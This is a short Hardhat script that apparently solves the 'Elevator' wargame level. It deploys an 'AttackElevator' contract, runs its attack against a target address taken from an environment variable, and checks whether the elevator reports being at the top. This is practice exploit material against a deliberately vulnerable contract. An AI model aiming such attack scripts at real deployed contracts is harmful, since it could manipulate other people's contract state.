import {ethers} from "hardhat"
import dotenv from 'dotenv'
import {Elevator} from "../typechain-types";

dotenv.config()

async function main() {
    const isLocalTest = false

    let target: Elevator
    if (isLocalTest) {
        target = await ethers.deployContract('Elevator')
    } else {
        target = await ethers.getContractAt('Elevator', process.env.TARGET_ADDRESS_12!)
    }

    const attacker = await ethers.deployContract('AttackElevator')
    // attack
    await attacker.attack(target.target)
    console.log(`target's top? : ${await target.top()}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
